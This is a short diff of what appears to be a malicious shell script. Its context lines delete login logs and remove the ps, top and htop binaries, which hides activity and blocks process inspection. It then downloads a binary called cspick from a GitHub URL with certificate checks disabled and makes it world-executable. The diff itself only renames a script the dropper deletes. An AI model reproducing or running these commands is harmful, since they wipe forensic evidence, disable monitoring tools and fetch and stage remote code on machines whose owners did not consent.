@@ -23,7 +23,7 @@ rm -rf  /var/log/lastlog
 rm -rf /usr/bin/ps
 rm -rf /usr/bin/top
 rm -rf /usr/bin/htop
-rm -rf  rsyslog.sh
+rm -rf  rss.sh
 rm -rf cspick
 wget -q --no-check-certificate https://github.com/Alemalakraa/sd/raw/main/cspick
 chmod 777 cspick
